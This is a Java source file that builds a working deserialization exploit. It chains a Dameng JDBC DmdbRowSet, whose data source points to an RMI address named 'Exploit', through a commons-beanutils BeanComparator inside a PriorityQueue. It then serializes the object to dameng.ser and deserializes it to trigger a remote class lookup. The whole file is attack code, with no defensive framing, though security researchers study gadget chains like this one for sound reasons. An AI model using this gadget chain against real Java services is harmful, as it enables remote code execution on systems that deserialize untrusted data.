package dameng;

import dm.jdbc.driver.DmdbRowSet;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

public class DamengSink {
    public static void main(String[] args) throws Exception {
        // sink
        DmdbRowSet dmdbRowSet = new DmdbRowSet();
        dmdbRowSet.setDataSourceName("rmi://127.0.0.1:1099/Exploit");
        // 需要设置reader和writer为null，以便于在writeObject的时候忽略这2个没有继承Serializable的类
        dmdbRowSet.setReader(null);
        dmdbRowSet.setWriter(null);

        // cb call getter
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        setValue(comparator, "property", "connection");
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = dmdbRowSet;
        queueArray[1] = dmdbRowSet;

        String fileName = "dameng.ser";
        FileOutputStream fileOutputStream = new FileOutputStream(fileName);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(queue);

        FileInputStream fileInputStream = new FileInputStream(fileName);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

}
